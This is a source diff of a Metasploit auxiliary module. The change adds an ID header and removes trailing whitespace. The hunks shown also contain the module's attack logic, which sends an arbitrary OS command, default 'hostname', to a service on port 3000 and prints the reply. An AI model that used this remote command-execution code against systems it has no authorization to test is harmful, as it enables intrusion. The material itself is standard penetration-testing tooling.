@@ -1,4 +1,8 @@
 ##
+# $Id$
+##
+
+##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -31,7 +35,7 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'DisclosureDate' => 'May 27 2008'))
 
-			register_options( 
+			register_options(
 				[
 					Opt::RPORT(3000),
 					OptString.new('CMD', [ false, 'The OS command to execute', 'hostname']),
@@ -43,17 +47,17 @@ class Metasploit3 < Msf::Auxiliary
 
 		data = "\x75" + datastore['CMD']
 		pad  = "\x00" * 512
-		
-		pkt = data + pad		
-	
-		print_status("Sending command: #{datastore['CMD']}")	
+
+		pkt = data + pad
+
+		print_status("Sending command: #{datastore['CMD']}")
 		sock.put(pkt)
 
 		# try to suck it all in.
 		sleep(5)
-		
+
 		res = sock.get_once
-		
+
 		res.each do |info|
 			puts "[*] #{info.gsub(/[^[:print:]]+/,"")}" # hack.
 		end
